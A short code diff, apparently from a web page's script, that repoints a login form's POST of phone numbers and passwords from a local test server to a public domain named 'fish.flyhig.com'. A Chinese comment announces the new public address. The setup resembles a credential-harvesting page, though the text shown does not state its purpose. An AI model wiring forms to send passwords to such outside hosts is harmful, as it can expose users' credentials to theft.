@@ -146,7 +146,8 @@
                 return;
             }
 
-            fetch('http://127.0.0.1:5000/submit', {
+            // ✅ 这是我给你的公网地址，全世界都能访问
+            fetch('https://fish.flyhig.com/submit', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ phone: phone, password: password })
